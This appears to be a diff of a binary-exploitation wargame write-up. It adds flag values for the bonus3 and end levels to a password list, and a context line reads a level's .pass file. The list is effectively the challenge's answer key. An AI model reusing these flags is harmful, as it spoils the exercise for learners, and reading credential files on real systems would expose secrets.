 
 ## Misc / References
 
@@ -2738,12 +3254,6 @@ $ cat /home/user/bonus2/.pass
 - [Linux startup callgraph](http://dbp-consulting.com/tutorials/debugging/linuxProgramStartup.html)
 
 ![](https://www.tortall.net/projects/yasm/manual/html/objfmt-win64/calling-convention.png)
-
-### ASM Returns
-
-```asm
-lea    eax,[ebp-0x4c]
-```
 
 ![](https://itandsecuritystuffs.files.wordpress.com/2014/03/image_thumb2.png?w=617&h=480)
 
@@ -2793,10 +3303,6 @@ bonus3:x:2013:2013::/home/user/bonus3:/bin/bash
 end:x:2014:2014::/home/user/end:/bin/bash
 ```
 
-### Todo list
-
-- [ ]
-
 ### Passwords
 
 ```bash
@@ -2813,5 +3319,6 @@ level9 -> c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
 bonus0 -> 
 bonus1 -> cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
 bonus2 -> 579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
-bonus3 ->
+bonus3 -> 71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
+end    -> 3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
 ```
